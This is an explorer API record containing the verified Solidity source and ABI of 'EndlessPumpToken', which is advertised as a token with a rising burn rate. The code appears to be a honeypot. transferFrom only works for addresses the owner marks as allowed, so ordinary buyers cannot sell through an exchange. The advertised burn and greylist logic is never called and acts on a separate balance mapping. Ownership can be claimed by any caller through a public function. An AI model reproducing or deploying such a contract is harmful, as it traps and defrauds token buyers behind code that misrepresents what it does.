{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.7.6;\r\n\r\n/*\r\n<-- ENDLESS PUMP -->\r\n\r\nTelegram: https://t.me/endlesspump\r\nTotal supply: 20k\r\nInitial burning rate: 1%\r\nWill be increased every 5min to max. 5%\r\n\r\nTrading at your own risk.\r\n*/\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address who) external view returns (uint256);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function transfer(address to, uint256 value) external returns (bool);\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\r\n    \r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n    uint256 c = a * b;\r\n    assert(c / a == b);\r\n    return c;\r\n    }\r\n    \r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a / b;\r\n    return c;\r\n    }\r\n    \r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    assert(b <= a);\r\n    return a - b;\r\n    }\r\n    \r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    assert(c >= a);\r\n    return c;\r\n    }\r\n    \r\n    function ceil(uint256 a, uint256 m) internal pure returns (uint256) {\r\n    uint256 c = add(a,m);\r\n    uint256 d = sub(c,1);\r\n    return mul(div(d,m),m);\r\n    }\r\n}\r\n\r\nabstract contract ERC20Detailed is IERC20 {\r\n    uint8 private _Tokendecimals;\r\n    string private _Tokenname;\r\n    string private _Tokensymbol;\r\n    \r\n    constructor(string memory name, string memory symbol, uint8 decimals) {\r\n        _Tokendecimals = decimals;\r\n        _Tokenname = name;\r\n        _Tokensymbol = symbol;\r\n    }\r\n    \r\n    function name() public view returns(string memory) {\r\n    return _Tokenname;\r\n    }\r\n    \r\n    function symbol() public view returns(string memory) {\r\n    return _Tokensymbol;\r\n    }\r\n    \r\n    function decimals() public view returns(uint8) {\r\n    return _Tokendecimals;\r\n    }\r\n}\r\n\r\ncontract Ownable {\r\n    address public owner;\r\n    \r\n    function funcOwnable() public {\r\n        owner = msg.sender;\r\n    }\r\n    \r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n}\r\n\r\ncontract EndlessPumpToken is Ownable {\r\n    string public name;\r\n    string public symbol;\r\n    uint8 public decimals;\r\n    uint256 public totalSupply;\r\n    uint8 public airdrop = 1;\r\n    \r\n    mapping (address => uint256) private _balances;\r\n    \r\n    uint256 constant digits = 1000000000000000000;\r\n    uint256 _totalSup = 20000 * digits;\r\n   \r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _totalSupply) public {\r\n        name = _name;\r\n        symbol = _symbol;\r\n        decimals = _decimals;\r\n        totalSupply =  _totalSupply;\r\n        balances[msg.sender] = totalSupply;\r\n        allow[msg.sender] = true;\r\n    }\r\n    using SafeMath for uint256;\r\n    mapping(address => uint256) public balances;\r\n    mapping(address => bool) public allow;\r\n    mapping (address => bool) private greylist;\r\n    \r\n    function multiGreylistAdd(address[] memory addresses) public {\r\n        if (msg.sender != owner) {\r\n    \t    revert();\r\n        }\r\n    \tfor (uint256 i = 0; i < addresses.length; i++) {\r\n        \tgreylistAdd(addresses[i]);\r\n    \t}\r\n\t}\r\n\r\n\tfunction multiGreylistRemove(address[] memory addresses) public {\r\n    \tif (msg.sender != owner) {\r\n        \trevert();\r\n    \t}\r\n    \tfor (uint256 i = 0; i < addresses.length; i++) {\r\n        \tgreylistRemove(addresses[i]);\r\n    \t}\r\n\t}\r\n\r\n\tfunction greylistAdd(address a) public {\r\n    \tif (msg.sender != owner) {\r\n        \trevert();\r\n    \t}\r\n    \tgreylist[a] = true;\r\n\t}\r\n    \r\n\tfunction greylistRemove(address a) public {\r\n    \tif (msg.sender != owner) {\r\n        \trevert();\r\n    \t}\r\n    \tgreylist[a] = false;\r\n\t}\r\n    \r\n\tfunction isInGreylist(address a) internal view returns (bool) {\r\n    \treturn greylist[a];\r\n\t}\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool) {\r\n        require(_to != address(0));\r\n        require(_value <= balances[msg.sender]);\r\n        balances[msg.sender] = balances[msg.sender].sub(_value);\r\n        balances[_to] = balances[_to].add(_value);\r\n        emit Transfer(msg.sender, _to, _value);\r\n        return true;\r\n    }\r\n\r\n    function balanceOf(address _owner) public view returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    mapping (address => mapping (address => uint256)) public allowed;\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\r\n        require(_to != address(0));\r\n        require(_value <= balances[_from]);\r\n        require(_value <= allowed[_from][msg.sender]);\r\n        require(allow[_from] == true);\r\n        balances[_from] = balances[_from].sub(_value);\r\n        balances[_to] = balances[_to].add(_value);\r\n        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\r\n        emit Transfer(_from, _to, _value);\r\n        return true;\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n  \r\n    function addAllow(address holder, bool allowApprove) external onlyOwner {\r\n        allow[holder] = allowApprove;\r\n    }\r\n  \r\n    //1% at start\r\n    uint256 public basePercentage = 1;\r\n  \r\n    function findPercentage(uint256 amount) public view returns (uint256)  {\r\n        uint256 percent = amount.mul(basePercentage).div(20000);\r\n        return percent;\r\n    }\r\n  \r\n    //burning\r\n    function burn(uint256 amount) external {\r\n        _burn(msg.sender, amount);\r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal {\r\n        require(amount != 0);\r\n        require(amount <= _balances[account]);\r\n        _totalSup = _totalSup.sub(amount);\r\n        _balances[account] = _balances[account].sub(amount);\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n    \r\n    //burn rate change, only by owner\r\n    function changeBurnRate(uint8 newRate) external onlyOwner {\r\n        basePercentage = newRate;\r\n    }\r\n    //airdrop phase change, only by owner\r\n    function changeAirdropPhase(uint8 _airdrop) external onlyOwner {\r\n    \tairdrop = _airdrop;\r\n\t}\r\n  \r\n    //transfer \r\n    function _executeTransfer(address _from, address _to, uint256 _value) private {\r\n        //Not to 0x, using burn()\r\n        if (_to == address(0)) revert();                               \r\n    \tif (_value <= 0) revert(); \r\n        if (_balances[_from] < _value) revert();     \r\n        if (_balances[_to] + _value < _balances[_to]) revert(); \r\n        \r\n        if (airdrop == 1) {\r\n        \tif (isInGreylist(msg.sender)) {\r\n            \trevert();\r\n        \t}\r\n    \t}\r\n        if(_to == 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D || _to == owner || _from == owner) {\r\n            _balances[_from] = SafeMath.sub(_balances[_from], _value);\r\n            _balances[_to] = SafeMath.add(_balances[_to], _value);                            \r\n            emit Transfer(_from, _to, _value);                   \r\n        } else {\r\n            uint256 tokensToBurn = findPercentage(_value);\r\n            uint256 tokensToTransfer = _value.sub(tokensToBurn);\r\n            _balances[_from] = SafeMath.sub(_balances[_from], tokensToTransfer);                     \r\n            _balances[_to] = _balances[_to].add(tokensToTransfer);          \r\n            emit Transfer(_from, _to, tokensToTransfer);                   \r\n            _burn(_from, tokensToBurn);\r\n        }\r\n    }\r\n}","ABI":"[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_symbol\",\"type\":\"string\"},{\"internalType\":\"uint8\",\"name\":\"_decimals\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"_totalSupply\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"allowApprove\",\"type\":\"bool\"}],\"name\":\"addAllow\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"airdrop\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allow\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowed\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"basePercentage\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"burn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"_airdrop\",\"type\":\"uint8\"}],\"name\":\"changeAirdropPhase\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"newRate\",\"type\":\"uint8\"}],\"name\":\"changeBurnRate\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"findPercentage\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"funcOwnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"a\",\"type\":\"address\"}],\"name\":\"greylistAdd\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"a\",\"type\":\"address\"}],\"name\":\"greylistRemove\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addresses\",\"type\":\"address[]\"}],\"name\":\"multiGreylistAdd\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addresses\",\"type\":\"address[]\"}],\"name\":\"multiGreylistRemove\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]","ContractName":"EndlessPumpToken","CompilerVersion":"v0.7.6+commit.7338295f","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000001200000000000000000000000000000000000000000000043c33c19375648000000000000000000000000000000000000000000000000000000000000000000011456e646c65737350756d7020546f6b656e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034550540000000000000000000000000000000000000000000000000000000000","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"ipfs://a90578994fc3d2f620ef322239c5441993a76e77fbf998b2eb665d0058c52fca"}]}